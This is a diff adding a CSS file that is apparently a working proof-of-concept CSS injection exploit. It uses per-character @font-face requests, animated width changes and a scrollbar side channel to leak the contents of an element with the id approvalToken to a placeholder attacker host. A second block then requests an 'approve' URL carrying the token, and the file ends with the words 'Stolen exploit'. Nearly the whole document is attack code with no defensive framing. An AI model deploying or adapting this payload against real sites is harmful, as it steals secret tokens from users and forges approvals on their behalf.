@@ -1,0 +1,283 @@
+@font-face{font-family:has_A;src:url(http://CHANGE:CHANGE/?A);unicode-range:U+41;font-style:monospace;}
+@font-face{font-family:has_B;src:url(http://CHANGE:CHANGE/?B);unicode-range:U+42;font-style:monospace;}
+@font-face{font-family:has_C;src:url(http://CHANGE:CHANGE/?C);unicode-range:U+43;font-style:monospace;}
+@font-face{font-family:has_D;src:url(http://CHANGE:CHANGE/?D);unicode-range:U+44;font-style:monospace;}
+@font-face{font-family:has_E;src:url(http://CHANGE:CHANGE/?E);unicode-range:U+45;font-style:monospace;}
+@font-face{font-family:has_F;src:url(http://CHANGE:CHANGE/?F);unicode-range:U+46;font-style:monospace;}
+@font-face{font-family:has_G;src:url(http://CHANGE:CHANGE/?G);unicode-range:U+47;font-style:monospace;}
+@font-face{font-family:has_H;src:url(http://CHANGE:CHANGE/?H);unicode-range:U+48;font-style:monospace;}
+@font-face{font-family:has_I;src:url(http://CHANGE:CHANGE/?I);unicode-range:U+49;font-style:monospace;}
+@font-face{font-family:has_J;src:url(http://CHANGE:CHANGE/?J);unicode-range:U+4a;font-style:monospace;}
+@font-face{font-family:has_K;src:url(http://CHANGE:CHANGE/?K);unicode-range:U+4b;font-style:monospace;}
+@font-face{font-family:has_L;src:url(http://CHANGE:CHANGE/?L);unicode-range:U+4c;font-style:monospace;}
+@font-face{font-family:has_M;src:url(http://CHANGE:CHANGE/?M);unicode-range:U+4d;font-style:monospace;}
+@font-face{font-family:has_N;src:url(http://CHANGE:CHANGE/?N);unicode-range:U+4e;font-style:monospace;}
+@font-face{font-family:has_O;src:url(http://CHANGE:CHANGE/?O);unicode-range:U+4f;font-style:monospace;}
+@font-face{font-family:has_P;src:url(http://CHANGE:CHANGE/?P);unicode-range:U+50;font-style:monospace;}
+@font-face{font-family:has_Q;src:url(http://CHANGE:CHANGE/?Q);unicode-range:U+51;font-style:monospace;}
+@font-face{font-family:has_R;src:url(http://CHANGE:CHANGE/?R);unicode-range:U+52;font-style:monospace;}
+@font-face{font-family:has_S;src:url(http://CHANGE:CHANGE/?S);unicode-range:U+53;font-style:monospace;}
+@font-face{font-family:has_T;src:url(http://CHANGE:CHANGE/?T);unicode-range:U+54;font-style:monospace;}
+@font-face{font-family:has_U;src:url(http://CHANGE:CHANGE/?U);unicode-range:U+55;font-style:monospace;}
+@font-face{font-family:has_V;src:url(http://CHANGE:CHANGE/?V);unicode-range:U+56;font-style:monospace;}
+@font-face{font-family:has_W;src:url(http://CHANGE:CHANGE/?W);unicode-range:U+57;font-style:monospace;}
+@font-face{font-family:has_X;src:url(http://CHANGE:CHANGE/?X);unicode-range:U+58;font-style:monospace;}
+@font-face{font-family:has_Y;src:url(http://CHANGE:CHANGE/?Y);unicode-range:U+59;font-style:monospace;}
+@font-face{font-family:has_Z;src:url(http://CHANGE:CHANGE/?Z);unicode-range:U+5a;font-style:monospace;}
+@font-face{font-family:has_a;src:url(http://CHANGE:CHANGE/?a);unicode-range:U+61;font-style:monospace;}
+@font-face{font-family:has_b;src:url(http://CHANGE:CHANGE/?b);unicode-range:U+62;font-style:monospace;}
+@font-face{font-family:has_c;src:url(http://CHANGE:CHANGE/?c);unicode-range:U+63;font-style:monospace;}
+@font-face{font-family:has_d;src:url(http://CHANGE:CHANGE/?d);unicode-range:U+64;font-style:monospace;}
+@font-face{font-family:has_e;src:url(http://CHANGE:CHANGE/?e);unicode-range:U+65;font-style:monospace;}
+@font-face{font-family:has_f;src:url(http://CHANGE:CHANGE/?f);unicode-range:U+66;font-style:monospace;}
+@font-face{font-family:has_g;src:url(http://CHANGE:CHANGE/?g);unicode-range:U+67;font-style:monospace;}
+@font-face{font-family:has_h;src:url(http://CHANGE:CHANGE/?h);unicode-range:U+68;font-style:monospace;}
+@font-face{font-family:has_i;src:url(http://CHANGE:CHANGE/?i);unicode-range:U+69;font-style:monospace;}
+@font-face{font-family:has_j;src:url(http://CHANGE:CHANGE/?j);unicode-range:U+6a;font-style:monospace;}
+@font-face{font-family:has_k;src:url(http://CHANGE:CHANGE/?k);unicode-range:U+6b;font-style:monospace;}
+@font-face{font-family:has_l;src:url(http://CHANGE:CHANGE/?l);unicode-range:U+6c;font-style:monospace;}
+@font-face{font-family:has_m;src:url(http://CHANGE:CHANGE/?m);unicode-range:U+6d;font-style:monospace;}
+@font-face{font-family:has_n;src:url(http://CHANGE:CHANGE/?n);unicode-range:U+6e;font-style:monospace;}
+@font-face{font-family:has_o;src:url(http://CHANGE:CHANGE/?o);unicode-range:U+6f;font-style:monospace;}
+@font-face{font-family:has_p;src:url(http://CHANGE:CHANGE/?p);unicode-range:U+70;font-style:monospace;}
+@font-face{font-family:has_q;src:url(http://CHANGE:CHANGE/?q);unicode-range:U+71;font-style:monospace;}
+@font-face{font-family:has_r;src:url(http://CHANGE:CHANGE/?r);unicode-range:U+72;font-style:monospace;}
+@font-face{font-family:has_s;src:url(http://CHANGE:CHANGE/?s);unicode-range:U+73;font-style:monospace;}
+@font-face{font-family:has_t;src:url(http://CHANGE:CHANGE/?t);unicode-range:U+74;font-style:monospace;}
+@font-face{font-family:has_u;src:url(http://CHANGE:CHANGE/?u);unicode-range:U+75;font-style:monospace;}
+@font-face{font-family:has_v;src:url(http://CHANGE:CHANGE/?v);unicode-range:U+76;font-style:monospace;}
+@font-face{font-family:has_w;src:url(http://CHANGE:CHANGE/?w);unicode-range:U+77;font-style:monospace;}
+@font-face{font-family:has_x;src:url(http://CHANGE:CHANGE/?x);unicode-range:U+78;font-style:monospace;}
+@font-face{font-family:has_y;src:url(http://CHANGE:CHANGE/?y);unicode-range:U+79;font-style:monospace;}
+@font-face{font-family:has_z;src:url(http://CHANGE:CHANGE/?z);unicode-range:U+7a;font-style:monospace;}
+@font-face{font-family:has_0;src:url(http://CHANGE:CHANGE/?0);unicode-range:U+30;font-style:monospace;}
+@font-face{font-family:has_1;src:url(http://CHANGE:CHANGE/?1);unicode-range:U+31;font-style:monospace;}
+@font-face{font-family:has_2;src:url(http://CHANGE:CHANGE/?2);unicode-range:U+32;font-style:monospace;}
+@font-face{font-family:has_3;src:url(http://CHANGE:CHANGE/?3);unicode-range:U+33;font-style:monospace;}
+@font-face{font-family:has_4;src:url(http://CHANGE:CHANGE/?4);unicode-range:U+34;font-style:monospace;}
+@font-face{font-family:has_5;src:url(http://CHANGE:CHANGE/?5);unicode-range:U+35;font-style:monospace;}
+@font-face{font-family:has_6;src:url(http://CHANGE:CHANGE/?6);unicode-range:U+36;font-style:monospace;}
+@font-face{font-family:has_7;src:url(http://CHANGE:CHANGE/?7);unicode-range:U+37;font-style:monospace;}
+@font-face{font-family:has_8;src:url(http://CHANGE:CHANGE/?8);unicode-range:U+38;font-style:monospace;}
+@font-face{font-family:has_9;src:url(http://CHANGE:CHANGE/?9);unicode-range:U+39;font-style:monospace;}
+@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}
+
+
+@keyframes trychar {
+    0% { font-family: rest; }
+
+    0.81% { font-family: has_A, rest; --leak: url(?A); }
+    1.62% { font-family: rest; }
+    2.43% { font-family: has_B, rest; --leak: url(?B); }
+    3.24% { font-family: rest; }
+    4.05% { font-family: has_C, rest; --leak: url(?C); }
+    4.86% { font-family: rest; }
+    5.67% { font-family: has_D, rest; --leak: url(?D); }
+    6.48% { font-family: rest; }
+    7.29% { font-family: has_E, rest; --leak: url(?E); }
+    8.10% { font-family: rest; }
+    8.91% { font-family: has_F, rest; --leak: url(?F); }
+    9.72% { font-family: rest; }
+    10.53% { font-family: has_G, rest; --leak: url(?G); }
+    11.34% { font-family: rest; }
+    12.15% { font-family: has_H, rest; --leak: url(?H); }
+    12.96% { font-family: rest; }
+    13.77% { font-family: has_I, rest; --leak: url(?I); }
+    14.58% { font-family: rest; }
+    15.39% { font-family: has_J, rest; --leak: url(?J); }
+    16.20% { font-family: rest; }
+    17.01% { font-family: has_K, rest; --leak: url(?K); }
+    17.82% { font-family: rest; }
+    18.63% { font-family: has_L, rest; --leak: url(?L); }
+    19.44% { font-family: rest; }
+    20.25% { font-family: has_M, rest; --leak: url(?M); }
+    21.06% { font-family: rest; }
+    21.87% { font-family: has_N, rest; --leak: url(?N); }
+    22.68% { font-family: rest; }
+    23.49% { font-family: has_O, rest; --leak: url(?O); }
+    24.30% { font-family: rest; }
+    25.11% { font-family: has_P, rest; --leak: url(?P); }
+    25.92% { font-family: rest; }
+    26.73% { font-family: has_Q, rest; --leak: url(?Q); }
+    27.54% { font-family: rest; }
+    28.35% { font-family: has_R, rest; --leak: url(?R); }
+    29.16% { font-family: rest; }
+    29.97% { font-family: has_S, rest; --leak: url(?S); }
+    30.78% { font-family: rest; }
+    31.59% { font-family: has_T, rest; --leak: url(?T); }
+    32.40% { font-family: rest; }
+    33.21% { font-family: has_U, rest; --leak: url(?U); }
+    34.02% { font-family: rest; }
+    34.83% { font-family: has_V, rest; --leak: url(?V); }
+    35.64% { font-family: rest; }
+    36.45% { font-family: has_W, rest; --leak: url(?W); }
+    37.26% { font-family: rest; }
+    38.07% { font-family: has_X, rest; --leak: url(?X); }
+    38.88% { font-family: rest; }
+    39.69% { font-family: has_Y, rest; --leak: url(?Y); }
+    40.50% { font-family: rest; }
+    41.31% { font-family: has_Z, rest; --leak: url(?Z); }
+    42.12% { font-family: rest; }
+    42.93% { font-family: has_0, rest; --leak: url(?0); }
+    43.74% { font-family: rest; }
+    44.55% { font-family: has_1, rest; --leak: url(?1); }
+    45.36% { font-family: rest; }
+    46.17% { font-family: has_2, rest; --leak: url(?2); }
+    46.98% { font-family: rest; }
+    47.79% { font-family: has_3, rest; --leak: url(?3); }
+    48.60% { font-family: rest; }
+    49.41% { font-family: has_4, rest; --leak: url(?4); }
+    50.22% { font-family: rest; }
+    51.03% { font-family: has_5, rest; --leak: url(?5); }
+    51.84% { font-family: rest; }
+    52.65% { font-family: has_6, rest; --leak: url(?6); }
+    53.46% { font-family: rest; }
+    54.27% { font-family: has_7, rest; --leak: url(?7); }
+    55.08% { font-family: rest; }
+    55.89% { font-family: has_8, rest; --leak: url(?8); }
+    56.70% { font-family: rest; }
+    57.51% { font-family: has_9, rest; --leak: url(?9); }
+    58.32% { font-family: rest; }
+    59.13% { font-family: has_a, rest; --leak: url(?a); }
+    59.94% { font-family: rest; }
+    60.75% { font-family: has_b, rest; --leak: url(?b); }
+    61.56% { font-family: rest; }
+    62.37% { font-family: has_c, rest; --leak: url(?c); }
+    63.18% { font-family: rest; }
+    64.00% { font-family: has_d, rest; --leak: url(?d); }
+    64.81% { font-family: rest; }
+    65.62% { font-family: has_e, rest; --leak: url(?e); }
+    66.43% { font-family: rest; }
+    67.24% { font-family: has_f, rest; --leak: url(?f); }
+    68.05% { font-family: rest; }
+    68.86% { font-family: has_g, rest; --leak: url(?g); }
+    69.67% { font-family: rest; }
+    70.48% { font-family: has_h, rest; --leak: url(?h); }
+    71.29% { font-family: rest; }
+    72.10% { font-family: has_i, rest; --leak: url(?i); }
+    72.91% { font-family: rest; }
+    73.72% { font-family: has_j, rest; --leak: url(?j); }
+    74.53% { font-family: rest; }
+    75.34% { font-family: has_k, rest; --leak: url(?k); }
+    76.15% { font-family: rest; }
+    76.96% { font-family: has_l, rest; --leak: url(?l); }
+    77.77% { font-family: rest; }
+    78.58% { font-family: has_m, rest; --leak: url(?m); }
+    79.39% { font-family: rest; }
+    80.20% { font-family: has_n, rest; --leak: url(?n); }
+    81.01% { font-family: rest; }
+    81.82% { font-family: has_o, rest; --leak: url(?o); }
+    82.63% { font-family: rest; }
+    83.44% { font-family: has_p, rest; --leak: url(?p); }
+    84.25% { font-family: rest; }
+    85.06% { font-family: has_q, rest; --leak: url(?q); }
+    85.87% { font-family: rest; }
+    86.68% { font-family: has_r, rest; --leak: url(?r); }
+    87.49% { font-family: rest; }
+    88.30% { font-family: has_s, rest; --leak: url(?s); }
+    89.11% { font-family: rest; }
+    89.92% { font-family: has_t, rest; --leak: url(?t); }
+    90.73% { font-family: rest; }
+    91.54% { font-family: has_u, rest; --leak: url(?u); }
+    92.35% { font-family: rest; }
+    93.16% { font-family: has_v, rest; --leak: url(?v); }
+    93.97% { font-family: rest; }
+    94.78% { font-family: has_w, rest; --leak: url(?w); }
+    95.59% { font-family: rest; }
+    96.40% { font-family: has_x, rest; --leak: url(?x); }
+    97.21% { font-family: rest; }
+    98.02% { font-family: has_y, rest; --leak: url(?y); }
+    98.83% { font-family: rest; }
+    99.64% { font-family: has_z, rest; --leak: url(?z); }
+    100% { font-family: rest; }
+}
+
+
+p#approvalToken {
+    overflow-y: auto; /* leak channel */
+    overflow-x: hidden; /* remove false positives */
+    height: 40px; /* comic sans capitals exceed this height */
+    font-size: 0px; /* make suffix invisible */
+    letter-spacing: 0px; /* separation */
+    word-break: break-all; /* small width split words in lines */
+    font-family: rest; /* default */
+    background: grey; /* default */
+    width: 0px; /* initial value */
+    animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
+    animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
+}
+
+p#approvalToken::first-line{
+    font-size: 30px; /* prefix is visible in first line */
+}
+
+
+@keyframes loop {
+    0% { width: 0px; }
+    1% { width: 20px; }
+    2% { width: 40px; }
+    3% { width: 60px; }
+    4% { width: 80px; }
+    5% { width: 100px; }
+    6% { width: 120px; }
+    7% { width: 140px; }
+    8% { width: 160px; }
+    9% { width: 180px; }
+    10% { width: 200px; }
+    11% { width: 220px; }
+    12% { width: 240px; }
+    13% { width: 260px; }
+    14% { width: 280px; }
+    15% { width: 300px; }
+    16% { width: 320px; }
+    17% { width: 340px; }
+    18% { width: 360px; }
+    19% { width: 380px; }
+    20% { width: 400px; }
+    21% { width: 420px; }
+    22% { width: 440px; }
+    23% { width: 460px; }
+    24% { width: 480px; }
+    25% { width: 500px; }
+    26% { width: 520px; }
+    27% { width: 540px; }
+    28% { width: 560px; }
+    29% { width: 580px; }
+    30% { width: 600px; }
+    31% { width: 620px; }
+    32% { width: 640px; }
+}
+
+
+p::-webkit-scrollbar {
+    background: blue;
+}
+
+/* side-channel */
+p::-webkit-scrollbar:vertical {
+    background: blue var(--leak);
+}
+
+.d-none {
+    display: block !important;
+}
+
+
+
+
+----
+
+
+@font-face {
+    font-family: poc;
+    src: url(http://CHANGE:CHANGE/approve/1/APPROVE_TOKEN);
+}
+
+p[id=approvalToken] ~* {
+    font-family: poc;
+}
+
+
+-------
+
+Stolen exploit
